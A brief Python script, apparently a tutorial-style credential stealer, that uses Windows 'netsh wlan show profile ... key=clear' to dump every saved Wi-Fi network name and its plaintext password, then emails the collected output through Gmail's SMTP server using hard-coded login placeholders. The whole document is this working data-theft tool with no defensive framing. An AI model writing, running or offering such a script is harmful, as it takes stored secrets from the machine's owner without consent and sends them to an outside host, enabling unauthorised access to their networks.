import subprocess, smtplib, re

def send_mail(email, password, message):
    # this will create a instance of smtp server so we can send our email
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email,email,message)
    server.quit()

#You can learn more about netsh here: https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
print(networks_names_list)

result = ""
for network_name in networks_names_list:
	network_name = '"'+ network_name + '"'
	command = "netsh wlan show profile " + network_name + " key=clear"
	current_result = subprocess.check_output(command, shell = True)
	result += current_result


send_mail("something@gmail.com", "mailpassword", result)
